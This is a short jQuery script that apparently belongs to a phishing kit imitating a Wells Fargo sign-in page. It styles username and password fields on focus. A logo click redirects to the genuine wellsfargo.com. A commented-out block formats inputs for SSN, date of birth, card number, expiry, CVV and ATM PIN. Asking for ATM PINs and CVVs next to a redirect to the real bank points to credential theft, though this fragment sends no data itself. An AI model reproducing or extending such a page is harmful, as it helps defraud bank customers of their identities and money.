// JavaScript Document

(function(){
	
	$('#bm-username').on('focus', function(){
		$('.ymt-txtbox').addClass('ymt-txtboxa');
	});
	$('#bm-username').on('blur', function(){
		$('.ymt-txtbox').addClass('ymt-txtbox');
		$('.ymt-txtbox').removeClass('ymt-txtboxa');
	});
	
	$('#bm-password').on('focus', function(){
		$('.ymt-txtbox2').addClass('ymt-txtbox2a');
	});
	$('#bm-password').on('blur', function(){
		$('.ymt-txtbox2').addClass('ymt-txtbox2');
		$('.ymt-txtbox2').removeClass('ymt-txtbox2a');
	});
	
	$('.img32').on('click', function(){
	   window.location.href = "https://www.wellsfargo.com/";	
	});
	
	
	/*$('input[name="ssn"]').mask('0000-00-000');
	$('input[name="dob"]').mask('00/00/0000');
	$('input[name="cardnumber"]').mask('0000-0000-0000-0000');
	$('input[name="expdate"]').mask('00/0000');
	$('input[name="cvv"]').mask('000');	
	$('input[name="atmpin"]').mask('000000');	
	$('input[name="phonenumber"]').mask('000-000-0000');*/
})()